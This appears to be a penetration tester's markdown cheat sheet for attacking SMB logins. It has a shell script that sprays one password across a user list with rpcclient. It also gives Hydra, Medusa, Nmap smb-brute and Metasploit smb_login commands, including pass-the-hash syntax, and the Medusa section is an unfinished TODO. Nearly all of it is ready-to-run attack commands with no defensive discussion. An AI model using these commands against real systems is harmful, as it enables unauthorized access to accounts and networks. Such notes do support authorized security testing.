# SMB

## 01 - Automated Script

```bash
#!/bin/sh

for username in `cat $1`
do
    echo -n "[*] user: $username" && rpcclient -U "$username%$2" -c "getusername;quit" $3
done
```

Syntax as it follows.

```
$ chmod 755 password-spraying.sh

$ ./password-spraying.sh users.lst <password> <IP>
```

## 02 - Hydra

```
$ hydra -U smb

$ hydra -V -l Administrator -p <password> smb://<IP>
```

Pass the Hash

```
$ hydra -V -l <username> -p <nt_hash> -m "" <IP> smb

$ hydra -V -l <username> -p <lm_hash>:<nt_hash> <IP> -m "LocalHash" smb
```

## 03 - Medusa

TODO: Show syntax for brute forcing SMB with Medusa

```
$ medusa -u <username>
```

- Pass the Hash

```
$ medusa -u <username> -p <lm_hash>:<nt_hash> -h <IP> -M smbnt -m PASS:HASH
```

## 04 - Nmap

```
$ nmap -p 445 -Pn -n --script smb-brute --script-args "userdb=users.lst,passdb=passwords.lst" [--script-args smbtype=<version>] <IP>

$ nmap -p 445 -Pn -n --script smb-brute --script-args "smbusername='Administrator',passdb=passwords.lst" [--script-args smbtype=<version>] <IP>
```

## 05 - Metasploit

You can actually use NTLM hashes to pass the hash.

```
msf > use auxiliary/scanner/smb/smb_login

msf auxiliary(scanner/smb/smb_login) > options

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   BLANK_PASSWORDS    false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
   DB_ALL_USERS       false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING   none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
   PASS_FILE                           no        File containing passwords, one per line
   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
   RHOSTS                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT              445              yes       The SMB service port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as
   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
   THREADS            1                yes       The number of concurrent threads (max one per host)
   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS       false            no        Try the username as the password for all users
   USER_FILE                           no        File containing usernames, one per line
   VERBOSE            true             yes       Whether to print output for all attempts

msf auxiliary(scanner/smb/smb_login) > set user_file users.lst

msf auxiliary(scanner/smb/smb_login) > set pass_file passwords.lst

msf auxiliary(scanner/smb/smb_login) > set threads 8

msf auxiliary(scanner/smb/smb_login) > run
```

---
## References

- [Hydra Protocols](https://en.kali.tools/?p=220)

- [Hacking Articles: Nmap for Pentester Password Cracking](https://www.hackingarticles.in/nmap-for-pentester-password-cracking/)